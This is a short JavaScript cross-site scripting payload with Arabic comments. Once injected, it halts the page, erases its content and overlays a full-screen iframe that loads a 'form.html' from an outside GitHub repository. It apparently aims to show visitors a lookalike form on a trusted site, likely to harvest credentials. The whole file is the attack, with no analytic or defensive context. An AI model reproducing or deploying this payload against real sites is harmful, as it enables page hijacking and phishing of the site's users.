(function() {
    if (window.XSS_DONE) return;
    window.XSS_DONE = true;

    // إيقاف المتصفح عن معالجة أي أحداث إضافية
    window.stop(); 

    // مسح الصفحة بالكامل واستبدالها بـ iframe
    var frame = document.createElement('iframe');
    frame.src = 'https://github.com/ItsS4LEH/sony.js/blob/main/form.html'; // رابط ملف html الخاص بك
    frame.style = "position:fixed; top:0; left:0; width:100%; height:100%; border:none; z-index:999999;";
    
    document.documentElement.innerHTML = ""; // مسح كل شيء
    document.appendChild(frame);
})();
